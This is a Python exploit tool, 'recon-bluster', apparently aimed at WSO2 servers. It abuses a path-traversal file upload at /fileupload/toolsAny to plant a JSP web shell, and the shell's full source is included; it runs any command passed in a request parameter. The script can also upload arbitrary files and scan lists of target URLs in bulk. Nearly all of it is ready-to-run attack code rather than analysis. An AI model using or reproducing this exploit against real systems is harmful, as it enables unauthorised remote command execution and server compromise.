#!/usr/bin/env python3
# coding:utf-8
import random
import os
import subprocess, os, argparse, sys
from pwn import *
from termcolor import colored
from threading import Thread
import requests, urllib3, sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

version = 1.0

def exploit(url, webshell):

    ## preparing webshell
    shell = """<FORM>
        <INPUT name='update' type=text>
        <INPUT type=submit value='Run'>
    </FORM>
    <%@ page import="java.io.*" %>
        <%
        String update = request.getParameter("update");
        String output = "";
        if(update != null) {
            String s = null;
            try {
                Process p = Runtime.getRuntime().exec(update,null,null);
                BufferedReader sI = new BufferedReader(new
    InputStreamReader(p.getInputStream()));
                while((s = sI.readLine()) != null) { output += s+"</br>"; }
            }  catch(IOException e) {   e.printStackTrace();   }
        }
    %>
            <pre><%=output %></pre>"""

    files = {f"../../../../repository/deployment/server/webapps/authenticationendpoint/{webshell}": shell}
    ## uploading wehshell
    response = requests.post(f'{url}/fileupload/toolsAny', files=files, verify=False)
    print(colored("Successfully upload shell at {}/authenticationendpoint/{}" .format(url, webshell), "red", attrs=['bold']))

def exploit_read(url, webshell,read):

    ## preparing webshell
    with open(read, encoding='utf-8') as file_obj:
        shell = file_obj.read()
    files = {f"../../../../repository/deployment/server/webapps/authenticationendpoint/{webshell}": shell}
    ## uploading wehshell
    response = requests.post(f'{url}/fileupload/toolsAny', files=files, verify=False)
    print(colored("Successfully upload shell at {}/authenticationendpoint/{}" .format(url, webshell), "red", attrs=['bold']))

def check(url, webshell):

    files = {f"../../../../repository/deployment/server/webapps/authenticationendpoint/404.jsp": ""}
    try:
        ## testing upload 404.jsp
        requests.post(f'{url}/fileupload/toolsAny', files=files, verify=False, timeout=5)
        response = requests.get(f'{url}/authenticationendpoint/404.jsp', verify=False, timeout=5)
        if len(response.text) == 0:
            ## if file successfully upload, exploitation proceed
            print(colored("{} is vulnerable" .format(url), "red", attrs=['bold']))
            exploit(url, webshell)
        else:
            ## not allow file upload
            print(colored("{} is not vulnerable" .format(url), "yellow", attrs=['bold']))
    except:
        ## timeout
        print(colored("{} is down" .format(url), "yellow", attrs=['bold']))
        pass

def check_read(url, webshell,read):

    files = {f"../../../../repository/deployment/server/webapps/authenticationendpoint/404.jsp": ""}
    try:
        ## testing upload 404.jsp
        requests.post(f'{url}/fileupload/toolsAny', files=files, verify=False, timeout=5)
        response = requests.get(f'{url}/authenticationendpoint/404.jsp', verify=False, timeout=5)
        if len(response.text) == 0:
            ## if file successfully upload, exploitation proceed
            print(colored("{} is vulnerable" .format(url), "red", attrs=['bold']))
            exploit_read(url, webshell,read)
        else:
            ## not allow file upload
            print(colored("{} is not vulnerable" .format(url), "yellow", attrs=['bold']))
    except:
        ## timeout
        print(colored("{} is down" .format(url), "yellow", attrs=['bold']))
        pass

def check_search(url, webshell):

    files = {f"../../../../repository/deployment/server/webapps/authenticationendpoint/404.jsp": ""}
    try:
        ## testing upload 404.jsp
        requests.post(f'{url}/fileupload/toolsAny', files=files, verify=False, timeout=5)
        response = requests.get(f'{url}/authenticationendpoint/404.jsp', verify=False, timeout=5)
        if len(response.text) == 0:
            ## if file successfully upload, exploitation proceed
            print(colored("{} is vulnerable" .format(url), "red", attrs=['bold']))
        else:
            ## not allow file upload
            print(colored("{} is not vulnerable" .format(url), "yellow", attrs=['bold']))
    except:
        ## timeout
        print(colored("{} is down" .format(url), "yellow", attrs=['bold']))
        pass

def banner():

    ## version
    print(colored("recon-bluster version {}" .format(version), "green", attrs=['bold']))

if __name__ == "__main__":

    ## version
    banner()

    ## parse argument
    ShellDef = ''
    for i in range(5):
        ShellDef += chr(random.randint(97, 122))
    ShellDef += ".jsp"
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", action="store", help="Target url, http://localhost:9443", default=False)
    parser.add_argument("-l", "--list", action="store", help="List of target url saperated with new line", default=False)
    parser.add_argument("-w", "--webshell", action="store", help="Webshell filename", default=ShellDef)
    parser.add_argument("-r", "--read", action="store", help="Enter the file path to upload any file",default=False)
    parser.add_argument("-s", "--search", action='store_true', help="Scan question URL", default=False)
    args = parser.parse_args()

    if args.search is not False:
        ## single target url
        if args.url is not False:
            url = args.url.rstrip("/")
        elif args.search is not False:
            url = args.search.rstrip("/")
        else:
            print("You need URL whatever in -r/-s")
            pass
        ## webshell
        webshell = args.webshell
        ## checking vulnerability
        check_search(url, webshell)

    elif args.url is not False:
        ## single target url
        url = args.url.rstrip("/")
        ## webshell
        webshell = args.webshell
        ## checking vulnerability
        if args.search is not False:
            check_search(url, webshell)
        elif args.read is not False:
            read = args.read
            check_read(url, webshell,read)
        else:
            check(url, webshell)

    elif args.list is not False:
        ## webshell
        webshell = args.webshell
        ## multiple target url
        with open(args.list) as urls:
            ## read url line by line
            for url in urls:
                url = url.rstrip().rstrip("/")
                ## checking vulnerability
                if args.search is not False:
                    check_search(url, webshell)
                elif args.read is not False:
                    read = args.read
                    check_read(url, webshell, read)
                else:
                    check(url, webshell)
    else:
        ## print help
        parser.print_help()
        parser.exit()
